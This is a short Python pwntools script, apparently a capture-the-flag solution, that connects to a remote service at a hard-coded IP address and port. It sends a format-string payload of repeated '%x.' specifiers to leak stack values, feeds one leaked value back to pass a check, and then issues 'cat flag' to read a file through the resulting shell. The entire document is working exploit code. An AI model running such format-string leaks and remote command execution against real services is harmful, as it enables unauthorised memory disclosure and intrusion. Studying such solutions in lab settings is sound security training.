import pwn 

conn = pwn.connect("3.71.110.92", 30050)

conn.recv()

conn.sendline(b'%x.' * 10)

line = conn.recv()
flag = int(line.split(b'.')[6], base=16)
conn.sendline(str(flag).encode())
conn.recv()

conn.sendline(b'cat flag')
print(conn.recv().decode())


conn.close()